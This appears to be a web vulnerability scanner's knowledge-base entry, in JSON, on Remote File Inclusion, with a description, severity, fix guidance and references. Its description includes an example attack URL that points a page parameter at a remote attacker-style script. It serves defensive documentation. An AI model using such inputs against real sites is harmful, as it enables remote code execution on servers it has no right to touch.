{
  "id": 42, 
  "title": "Remote File Inclusion", 
  "severity": "high", 
  "description": [
    "Web applications occasionally use parameter values to store the", 
    "location of a file which will later be required by the server.\n\nAn", 
    "example of this is often seen in error pages, where the actual file", 
    "path for the error page is stored in a parameter value -- for example", 
    "`example.com/error.php?page=404.php`.\n\nA remote file inclusion occurs", 
    "when the parameter value (ie. path to file being called by the server)", 
    "can be substituted with the address of remote resource -- for example:", 
    "`yoursite.com/error.asp?page=http://anothersite.com/somethingBad.php`", 
    "In some cases, the server will process the fetched resource;", 
    "therefore, if the resource contains server-side code matching that of", 
    "the framework being used (ASP, PHP, JSP, etc.), it is probable that", 
    "the resource will be executed as if it were part of the web", 
    "application.\n\nThe tool discovered that it was possible to substitute a", 
    "parameter value with an external resource and have the server fetch it", 
    "and include its contents in the response."
  ], 
  "fix": {
    "effort": 50, 
    "guidance": [
      "It is recommended that untrusted data is never used to form a file", 
      "location to be included.\n\nTo validate data, the application should", 
      "ensure that the supplied value for a file is permitted. This can be", 
      "achieved by performing whitelisting on the parameter value, by", 
      "matching it against a list of permitted files. If the supplied value", 
      "does not match any value in the whitelist, then the server should", 
      "redirect to a standard error page.\n\nIn some scenarios, where dynamic", 
      "content is being requested, it may not be possible to perform", 
      "validation against a list of trusted resources, therefore the list", 
      "must also become dynamic (updated as the files change), or perform", 
      "filtering to remove extraneous user input (such as semicolons, periods", 
      "etc.) and only permit `a-z0-9`.\n\nIt is also advised that sensitive", 
      "files are not stored within the web root and that the user permissions", 
      "enforced by the directory are correct."
    ]
  }, 
  "tags": [
    "remote", 
    "file", 
    "inclusion", 
    "injection", 
    "regexp"
  ], 
  "references": [
    {
      "url": "http://projects.webappsec.org/Remote-File-Inclusion", 
      "title": "WASC"
    }, 
    {
      "url": "http://en.wikipedia.org/wiki/Remote_File_Inclusion", 
      "title": "Wikipedia"
    }
  ]
}